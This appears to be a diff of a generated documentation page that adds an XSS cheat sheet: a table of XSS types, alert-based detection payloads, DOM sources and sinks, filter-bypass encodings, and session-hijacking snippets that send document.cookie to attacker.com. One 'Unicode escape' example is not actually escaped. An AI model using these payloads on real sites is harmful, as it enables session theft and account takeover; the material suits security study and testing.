@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#cross-site-scripting-xss" class="md-skip">
           Skip to content
         </a>
       
@@ -1023,6 +1023,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1039,6 +1057,80 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Types
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Hijacking
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dom-xss-sources-sinks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM XSS Sources &amp; Sinks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filter Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2933,69 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Types
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Hijacking
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dom-xss-sources-sinks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM XSS Sources &amp; Sinks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filter-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filter Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +3014,88 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)<a class="headerlink" href="#cross-site-scripting-xss" title="Permanent link">&para;</a></h1>
+<p>XSS allows injection of malicious scripts into pages viewed by other users. Impacts range from session theft to full account takeover.</p>
+<h2 id="types">Types<a class="headerlink" href="#types" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Persistence</th>
+<th>Execution</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reflected</td>
+<td>None</td>
+<td>URL parameter reflected in response</td>
+</tr>
+<tr>
+<td>Stored</td>
+<td>Database</td>
+<td>Saved and served to all users</td>
+</tr>
+<tr>
+<td>DOM-Based</td>
+<td>None</td>
+<td>Manipulates client-side DOM via JS</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-payloads">Detection Payloads<a class="headerlink" href="#detection-payloads" title="Permanent link">&para;</a></h2>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">// Basic alert test</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="s2">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="s2">&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="s2">// Event handler injection</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="s2">&lt;img src=x onerror=alert(1)&gt;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="s2">&lt;svg onload=alert(1)&gt;</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="s2">&lt;body onload=alert(1)&gt;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="s2">// Without parentheses (filter bypass)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="s2">&lt;script&gt;alert`1`&lt;/script&gt;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="s2">// javascript: URI</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="s2">&lt;a href=&quot;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="err">&quot;</span><span class="o">&gt;</span><span class="nx">click</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
+</span></code></pre></div>
+<h2 id="session-hijacking">Session Hijacking<a class="headerlink" href="#session-hijacking" title="Permanent link">&para;</a></h2>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">// Steal cookie and send to attacker</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://attacker.com/?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="c1">// Or with Image</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="s2">&quot;new Image().src=&#39;https://attacker.com/?c=&#39;+document.cookie&quot;</span><span class="o">&gt;</span>
+</span></code></pre></div>
+<h2 id="dom-xss-sources-sinks">DOM XSS Sources &amp; Sinks<a class="headerlink" href="#dom-xss-sources-sinks" title="Permanent link">&para;</a></h2>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">// Dangerous sources (user-controlled input)</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">document</span><span class="p">.</span><span class="nx">location</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="nb">document</span><span class="p">.</span><span class="nx">referrer</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1">// Dangerous sinks (write to page)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="nx">innerHTML</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">()</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="nb">eval</span><span class="p">()</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="nx">setTimeout</span><span class="p">()</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">input</span>
+</span></code></pre></div>
+<h2 id="filter-bypass">Filter Bypass<a class="headerlink" href="#filter-bypass" title="Permanent link">&para;</a></h2>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">// Case variation</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="o">&lt;</span><span class="nx">ScRiPt</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/sCrIpT&gt;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1">// HTML entities</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="err">/script&amp;gt;</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1">// Unicode escape</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1">// Double encoding</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="o">%</span><span class="mf">253</span><span class="nx">Cscript</span><span class="o">%</span><span class="mf">253</span><span class="nx">Ealert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">%</span><span class="mf">253</span><span class="nx">C</span><span class="o">/</span><span class="nx">script</span><span class="o">%</span><span class="mf">253</span><span class="nx">E</span>
+</span></code></pre></div>
 
 
 
